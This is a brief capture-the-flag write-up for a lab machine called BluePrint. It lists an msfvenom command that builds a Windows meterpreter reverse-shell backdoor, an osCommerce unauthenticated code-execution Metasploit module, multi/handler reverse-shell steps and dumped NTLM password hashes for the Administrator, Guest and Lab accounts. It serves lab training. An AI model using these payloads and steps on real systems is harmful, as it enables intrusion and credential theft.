# BluePrint
```
Export ip = 10.10.179.10
```

## Scan
```
Read The Scan File
```

## Enumeration
```
[File Upload Execution]
1. Reference File : 44374.py
2. Execution : configuraiton

[BackDoor Code Command]
msfvenom -p windows/meterpreter/reverse_tcp LHOST={} LPORT={} -f exe > backdoor.exe

[osCommerce]
1. Attack Vector : multi/http/oscommerce_installer_unauth_code_exec

[Get HashDump]
1. use exploit/multi/handler
2. Get ReverseShell 
```


## User 
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::
```

## Root
```
Research :  users folder
```